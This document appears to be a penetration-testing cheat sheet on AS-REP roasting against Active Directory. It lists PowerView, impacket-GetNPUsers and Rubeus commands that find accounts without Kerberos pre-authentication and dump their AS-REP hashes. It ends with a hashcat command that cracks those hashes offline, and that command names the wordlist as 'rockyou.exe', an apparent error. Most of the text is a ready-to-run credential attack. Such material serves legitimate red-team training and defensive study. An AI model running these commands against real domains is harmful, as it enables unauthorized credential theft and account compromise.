Adversaries may reveal credentials of accounts that have disabled Kerberos pre-authentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.

## AS-REP Roasting Methodology
First we must identify Users that do not require Kerberos pre-auth. BloodHound works. Here is another way.

#### Identify Users not requiring Kerberos pre-auth
```PowerShell
# PowerView
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired
```
```bash
# impacket-GetNPUsers
impacket-GetNPUsers -dc-ip <ip> -no-pass <domain/user> -request-outputfile hashes.asreproast
```

#### Authenticated AS-REP ROAST Attack
```bash
impacket-GetNPUsers -dc-ip <ip> -request -outputfile hashes.asreproast <domain>/<user>
	# The user is who we are authenticating with

# if we have a LIST of users
impacket-GetNPUsers -dc-ip <ip> -request -outputfile hashes.asreproast -usersfile users.txt '<domain>/'
```

#### Windows Attack
```powershell
.\Rubeus.exe asreproast /nowrap
	# nowrap prevents new lines being added to hashes
```

#### Cracking the Hashes
```bash
sudo hashcat -m 18200 hashes.asreproast rockyou.exe -r /usr/share/hashcat/rules/best64.rule --force
```
